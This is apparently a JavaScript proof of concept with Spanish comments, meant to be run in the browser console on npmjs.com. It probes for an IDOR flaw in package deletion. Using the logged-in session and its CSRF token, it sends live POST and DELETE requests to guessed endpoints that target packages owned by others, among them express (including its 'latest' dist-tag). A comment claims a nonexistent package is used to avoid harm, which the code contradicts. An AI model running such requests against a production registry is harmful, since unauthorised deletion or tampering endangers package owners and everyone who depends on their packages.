// ================================================================
// PoC: IDOR en eliminación/unpublish de paquetes
// ================================================================
// HIPÓTESIS: Si el formulario de eliminar paquete solo pide el
// nombre del paquete (sin validación extra como contraseña o código),
// ¿se puede eliminar un paquete ajeno?
//
// EJECUTAR EN: https://www.npmjs.com (sesión autenticada)
// ================================================================

console.log("=== PoC: IDOR en Eliminación de Paquetes ===\n");

const spiferackHeaders = {
    'x-spiferack': '1',
    'x-requested-with': 'XMLHttpRequest',
    'manifest-hash': window.__context__?.hash || ''
};
const csrftoken = window.__context__?.csrftoken ||
                  window.__context__?.context?.csrftoken || '';
const myUser = window.__context__?.user?.name ||
               window.__context__?.context?.user?.name || 'unknown';

console.log(`[*] Usuario: ${myUser}`);
console.log(`[*] CSRF: ${csrftoken ? csrftoken.substring(0, 15) + '...' : 'NO'}\n`);

async function sGet(path) {
    const res = await fetch(path, { headers: spiferackHeaders, credentials: 'include' });
    const ct = res.headers.get('content-type') || '';
    return {
        status: res.status,
        data: res.ok && ct.includes('json') ? await res.json() : null,
        headers: Object.fromEntries([...res.headers.entries()])
    };
}

async function sPost(path, body = {}) {
    const res = await fetch(path, {
        method: 'POST',
        headers: { ...spiferackHeaders, 'content-type': 'application/json', 'x-csrf-token': csrftoken },
        credentials: 'include',
        body: JSON.stringify({ csrftoken, ...body })
    });
    const ct = res.headers.get('content-type') || '';
    return {
        status: res.status,
        data: res.ok && ct.includes('json') ? await res.json() : await res.text().catch(() => null)
    };
}

async function sDelete(path, body = {}) {
    const res = await fetch(path, {
        method: 'DELETE',
        headers: { ...spiferackHeaders, 'content-type': 'application/json', 'x-csrf-token': csrftoken },
        credentials: 'include',
        body: JSON.stringify({ csrftoken, ...body })
    });
    const ct = res.headers.get('content-type') || '';
    return {
        status: res.status,
        data: res.ok && ct.includes('json') ? await res.json() : await res.text().catch(() => null)
    };
}

(async () => {

    // ================================================================
    // TEST 1: Ver la página de settings de UN PAQUETE PROPIO
    // Para entender qué datos y endpoints tiene el form de eliminar
    // ================================================================
    console.log("═══════════════════════════════════════════");
    console.log("  TEST 1: Settings de paquete propio");
    console.log("═══════════════════════════════════════════\n");

    // Paquetes propios para analizar la estructura
    const myPackages = [
        '@originmap/readme-svg-test',
        'openvite',
    ];

    for (const pkg of myPackages) {
        const encodedPkg = encodeURIComponent(pkg);

        // Página de settings del paquete
        const r1 = await sGet(`/package/${pkg}/settings`);
        if (r1.data) {
            console.log(`[+] /package/${pkg}/settings → HTTP ${r1.status}`);
            console.log(`    Keys: ${Object.keys(r1.data).join(', ')}`);

            // Buscar datos del form de eliminar
            if (r1.data.deleteAction) console.log(`    [!!!] deleteAction: ${r1.data.deleteAction}`);
            if (r1.data.unpublishAction) console.log(`    [!!!] unpublishAction: ${r1.data.unpublishAction}`);
            if (r1.data.action) console.log(`    action: ${r1.data.action}`);

            // Buscar cualquier URL que contenga "delete" o "unpublish"
            const full = JSON.stringify(r1.data);
            const deleteMatches = full.match(/"[^"]*(?:delete|unpublish|remove)[^"]*"/gi);
            if (deleteMatches) {
                console.log(`    [!!!] Campos delete/unpublish: ${[...new Set(deleteMatches)].join(', ')}`);
            }

            // Mostrar formData si existe
            if (r1.data.formData) {
                console.log(`    formData keys: ${Object.keys(r1.data.formData).join(', ')}`);
                for (const [k, v] of Object.entries(r1.data.formData)) {
                    console.log(`      ${k}: ${JSON.stringify(v).substring(0, 150)}`);
                }
            }

            // Mostrar todo si es corto
            if (full.length < 3000) {
                console.log(`    DATOS COMPLETOS: ${full}`);
            } else {
                // Mostrar cada key resumida
                for (const k of Object.keys(r1.data)) {
                    const v = JSON.stringify(r1.data[k]);
                    console.log(`    ${k}: ${v.substring(0, 200)}${v.length > 200 ? '...' : ''}`);
                }
            }
        } else {
            console.log(`[-] /package/${pkg}/settings → HTTP ${r1.status}`);
        }

        // Probar variantes de la URL
        const settingsVariants = [
            `/package/${pkg}/settings`,
            `/settings/${myUser}/packages/${encodedPkg}`,
            `/settings/${myUser}/packages/${encodedPkg}/delete`,
            `/package/${pkg}/delete`,
            `/package/${pkg}/unpublish`,
            `/-/package/${encodedPkg}/dist-tags`,
        ];

        for (const url of settingsVariants) {
            if (url === `/package/${pkg}/settings`) continue; // ya lo probamos
            const r = await sGet(url);
            if (r.data) {
                console.log(`\n[+] ${url} → HTTP ${r.status}`);
                const full = JSON.stringify(r.data);
                if (full.length < 1000) {
                    console.log(`    Data: ${full}`);
                } else {
                    console.log(`    Keys: ${Object.keys(r.data).join(', ')}`);
                }
            } else {
                console.log(`[-] ${url} → HTTP ${r.status}`);
            }
        }

        console.log('');
    }


    // ================================================================
    // TEST 2: Intentar ver settings de un paquete AJENO
    // Si podemos ver el form de delete de un paquete que no es nuestro,
    // ya hay un problema de acceso
    // ================================================================
    console.log("\n═══════════════════════════════════════════");
    console.log("  TEST 2: Settings de paquetes AJENOS");
    console.log("═══════════════════════════════════════════\n");

    const foreignPackages = [
        'express',
        'lodash',
        'react',
        '@vercel/next',
    ];

    for (const pkg of foreignPackages) {
        const r = await sGet(`/package/${pkg}/settings`);
        if (r.data) {
            console.log(`[!!!] /package/${pkg}/settings → HTTP ${r.status}`);
            console.log(`    Keys: ${Object.keys(r.data).join(', ')}`);

            // Si hay deleteAction o unpublishAction, es grave
            const full = JSON.stringify(r.data);
            if (full.includes('delete') || full.includes('unpublish')) {
                console.log(`    [!!!] CONTIENE delete/unpublish EN LA RESPUESTA`);
                const matches = full.match(/"[^"]*(?:delete|unpublish)[^"]*"/gi);
                if (matches) console.log(`    Matches: ${matches.join(', ')}`);
            }
        } else {
            console.log(`[-] /package/${pkg}/settings → HTTP ${r.status}`);
        }
    }


    // ================================================================
    // TEST 3: Si encontramos el endpoint de delete, intentar
    // enviar POST/DELETE a un paquete ajeno (SIN confirmar)
    // NOTA: Usamos un paquete que NO existe para no causar daño
    // ================================================================
    console.log("\n═══════════════════════════════════════════");
    console.log("  TEST 3: Intentar DELETE en paquete ajeno");
    console.log("═══════════════════════════════════════════\n");

    // Probar endpoints comunes de delete/unpublish
    const deleteEndpoints = [
        // Variantes con POST
        { method: 'POST', url: '/package/express/delete', body: { packageName: 'express' } },
        { method: 'POST', url: '/package/express/unpublish', body: { packageName: 'express' } },
        { method: 'POST', url: '/settings/ljharb/packages/express/delete', body: {} },

        // Variantes con DELETE
        { method: 'DELETE', url: '/package/express', body: {} },
        { method: 'DELETE', url: '/-/package/express/dist-tags/latest', body: {} },
    ];

    for (const ep of deleteEndpoints) {
        try {
            let r;
            if (ep.method === 'DELETE') {
                r = await sDelete(ep.url, ep.body);
            } else {
                r = await sPost(ep.url, ep.body);
            }
            console.log(`${ep.method} ${ep.url} → HTTP ${r.status}`);
            if (r.status === 200 || r.status === 201) {
                console.log(`    [!!!] ACEPTADO: ${JSON.stringify(r.data).substring(0, 300)}`);
            } else if (r.data) {
                console.log(`    Respuesta: ${JSON.stringify(r.data).substring(0, 200)}`);
            }
        } catch(e) {
            console.log(`${ep.method} ${ep.url} → Error: ${e.message}`);
        }
    }


    // ================================================================
    // TEST 4: Probar entre nuestras dos cuentas
    // Logueado como una cuenta, intentar eliminar paquete de la otra
    // ================================================================
    console.log("\n═══════════════════════════════════════════");
    console.log("  TEST 4: Cross-account delete (cuentas propias)");
    console.log("═══════════════════════════════════════════\n");

    // Determinar qué paquete es de la OTRA cuenta
    const targetPkg = myUser === 'andrysilva'
        ? '@connextjs/cli'        // paquete de owellandry
        : '@originmap/no-scan';   // paquete de andrysilva

    console.log(`[*] Logueado como: ${myUser}`);
    console.log(`[*] Paquete objetivo (otra cuenta): ${targetPkg}`);

    // Ver si podemos acceder al settings del paquete de la otra cuenta
    const r4a = await sGet(`/package/${targetPkg}/settings`);
    console.log(`\nGET /package/${targetPkg}/settings → HTTP ${r4a.status}`);
    if (r4a.data) {
        console.log(`    [!!!] ACCESO A SETTINGS DE PAQUETE AJENO`);
        console.log(`    Keys: ${Object.keys(r4a.data).join(', ')}`);

        const full = JSON.stringify(r4a.data);
        if (full.includes('delete') || full.includes('unpublish')) {
            console.log(`    [!!!] CONTIENE OPCIONES DE DELETE/UNPUBLISH`);
        }
    }

    // Intentar POST a delete/unpublish del paquete ajeno
    const deleteUrls = [
        `/package/${targetPkg}/delete`,
        `/package/${targetPkg}/unpublish`,
        `/package/${encodeURIComponent(targetPkg)}/delete`,
    ];

    for (const url of deleteUrls) {
        const r = await sPost(url, { packageName: targetPkg });
        console.log(`POST ${url} → HTTP ${r.status}`);
        if (r.status === 200) {
            console.log(`    [!!!] ACEPTADO: ${JSON.stringify(r.data).substring(0, 300)}`);
        }
    }


    // ================================================================
    // TEST 5: Verificar si la eliminación requiere escalación
    // ================================================================
    console.log("\n═══════════════════════════════════════════");
    console.log("  TEST 5: ¿Requiere escalación para eliminar?");
    console.log("═══════════════════════════════════════════\n");

    // Verificar si hay datos de escalación en la página de settings
    const ownPkg = myUser === 'andrysilva' ? 'openvite' : '@connextjs/cli';
    const r5 = await sGet(`/package/${ownPkg}/settings`);
    if (r5.data) {
        console.log(`[+] /package/${ownPkg}/settings:`);

        // Buscar campos de escalación
        const full = JSON.stringify(r5.data);
        const escalateMatches = full.match(/"[^"]*(?:escalat|confirm|verify|password|auth|tfa|2fa|totp)[^"]*"/gi);
        if (escalateMatches) {
            console.log(`    Campos de seguridad: ${[...new Set(escalateMatches)].join(', ')}`);
        } else {
            console.log(`    [!!!] SIN CAMPOS DE SEGURIDAD/ESCALACIÓN`);
        }

        // Buscar si hay requiresEscalation, needsAuth, etc.
        if (r5.data.requiresEscalation !== undefined) console.log(`    requiresEscalation: ${r5.data.requiresEscalation}`);
        if (r5.data.needsAuth !== undefined) console.log(`    needsAuth: ${r5.data.needsAuth}`);
        if (r5.data.escalationRequired !== undefined) console.log(`    escalationRequired: ${r5.data.escalationRequired}`);

        // Mostrar estructura del form
        if (r5.data.formData) {
            console.log(`    formData: ${JSON.stringify(r5.data.formData)}`);
        }
    }


    // ================================================================
    // TEST 6: Analizar el flujo real de eliminación
    // Ir a /package/{pkg}/settings y ver qué form se renderiza
    // ================================================================
    console.log("\n═══════════════════════════════════════════");
    console.log("  TEST 6: Análisis del DOM del form de delete");
    console.log("═══════════════════════════════════════════\n");

    // Si estamos en una página de settings de paquete, analizar el DOM
    if (window.location.pathname.includes('/settings')) {
        const forms = document.querySelectorAll('form');
        console.log(`[+] Forms en la página: ${forms.length}`);
        forms.forEach((form, i) => {
            console.log(`\n  Form #${i}:`);
            console.log(`    action: ${form.action}`);
            console.log(`    method: ${form.method}`);
            console.log(`    id: ${form.id}`);

            // Listar inputs
            const inputs = form.querySelectorAll('input, select, textarea, button');
            inputs.forEach(input => {
                const type = input.type || input.tagName.toLowerCase();
                const name = input.name || input.id || '';
                const value = input.value || '';
                if (name === 'csrftoken') {
                    console.log(`    input: ${type} name="${name}" value="${value.substring(0,15)}..."`);
                } else {
                    console.log(`    input: ${type} name="${name}" value="${value}"`);
                }
            });

            // ¿Tiene campo de confirmación?
            if (form.innerHTML.includes('confirm') || form.innerHTML.includes('type the name')) {
                console.log(`    [*] Tiene campo de confirmación de nombre`);
            }
        });
    } else {
        console.log("[-] No estás en una página de settings. Navega a:");
        console.log(`    https://www.npmjs.com/package/${ownPkg}/settings`);
        console.log("    y re-ejecuta este script para analizar el form de delete.");
    }

    console.log("\n=== FIN ===");
})();
